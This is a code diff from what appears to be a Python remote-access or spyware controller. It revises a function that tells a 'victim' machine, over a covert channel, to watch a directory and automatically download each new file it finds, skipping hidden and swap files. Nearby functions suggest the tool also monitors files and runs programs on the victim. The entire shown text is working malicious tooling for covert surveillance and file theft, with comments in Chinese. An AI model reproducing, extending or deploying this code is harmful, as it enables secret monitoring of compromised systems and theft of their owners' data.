@@ -380,42 +380,51 @@ def cmd_monitor_file(comm: Commander):
         comm.send_covert_message(b"CMD_STOP_MON_FILE")
 
 
-
-
-
 def cmd_monitor_dir(comm: Commander):
     dir_path = input("Enter directory path on victim to monitor: ").strip()
-    print(f"[Commander] 开始监控目录：{dir_path}（仅根目录文件；新增文件时下载，忽略隐藏/Swap 文件）")
+    print(f"[Commander] 开始监控目录：{dir_path}（仅根目录，忽略隐藏/Swap 文件）")
     comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
 
+    processed = set()  # 记录已经下载过的文件名
     try:
         while True:
             data = comm.recv_covert_message()
             if not data:
                 continue  # 超时重试
 
-            # 只处理 JSON 事件
+            # JSON 解析，去掉两头可能的空白
             try:
-                msg = json.loads(data.decode('utf-8', errors='ignore'))
+                raw = data.decode('utf-8', errors='ignore').strip()
+                msg = json.loads(raw)
             except Exception:
+                # 非 JSON 消息就跳过
                 continue
 
-            typ      = msg.get('type', '')
-            basepath = msg.get('path', '')
-            fname    = msg.get('filename', '')
+            typ = msg.get('type', '')
+            fname = msg.get('filename', '')
 
-            # 只有真正的“新增文件”事件才下载，且过滤隐藏/Swap 文件
-            if typ == "MON_DIR_ADDED" and basepath and fname:
-                # 跳过隐藏文件（以 . 开头）和 Vim swap 文件（.swp）
-                if fname.startswith('.') or fname.endswith('.swp'):
-                    # print(f"[DEBUG] 忽略文件：{fname}")
-                    continue
+            # 调试输出，看看到底收到哪些事件
+            print(f"[DEBUG] 收到事件: {typ} | 文件: {fname}")
 
-                full_path = os.path.join(basepath, fname)
-                print(f"[{msg.get('timestamp','')}] 目录中新文件：{full_path}")
+            # 过滤：只对真正的 MON_DIR_ADDED 触发，并且
+            # 1) 文件名不能以 . 开头
+            # 2) 不能以 .swp 结尾
+            # 3) 还没下载过
+            if (typ == "MON_DIR_ADDED"
+                    and fname
+                    and not fname.startswith('.')
+                    and not fname.endswith('.swp')
+                    and fname not in processed):
+
+                processed.add(fname)
+                full_path = os.path.join(dir_path, fname)
+                print(f"[{msg.get('timestamp', '')}] 目录中新文件：{full_path}")
+
+                # 调用下载
                 try:
-                    local_name = os.path.basename(full_path)
-                    if not comm.download_file_with_debug(full_path, local_name):
+                    local_name = fname  # 保持原名
+                    ok = comm.download_file_with_debug(full_path, local_name)
+                    if not ok:
                         print(f"[!] 下载失败：{full_path}")
                 except Exception as e:
                     print(f"[!] 下载异常：{e}")
@@ -423,9 +432,6 @@ def cmd_monitor_dir(comm: Commander):
     except KeyboardInterrupt:
         print("\n[*] 停止目录监控。")
         comm.send_covert_message(b"CMD_STOP_MON_DIR")
-
-
-
 
 
 def cmd_run_program(comm: Commander):
